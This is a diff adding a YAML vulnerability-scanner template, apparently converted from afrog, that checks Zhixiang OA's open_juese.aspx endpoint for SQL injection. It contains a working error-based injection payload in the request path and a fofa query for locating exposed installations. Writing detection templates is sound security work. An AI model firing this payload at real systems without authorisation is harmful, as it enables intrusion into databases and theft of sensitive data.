@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - nvarchar
+          - '[SqlException]'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr=1'
+id: zhixiang-oa-open-juese-sqli
+info:
+  author: zan8in
+  description: |
+    致翔OA open_juese存在SQL注入漏洞，未经授权的攻击者可通过该漏洞获取数据库敏感信息。
+    fofa: app="致翔软件-致翔OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 致翔 OA 系统接口 open_juese 存在 SQL 注入漏洞
+  severity: high
+  tags: zhixiang,oa,sqli,argus-import
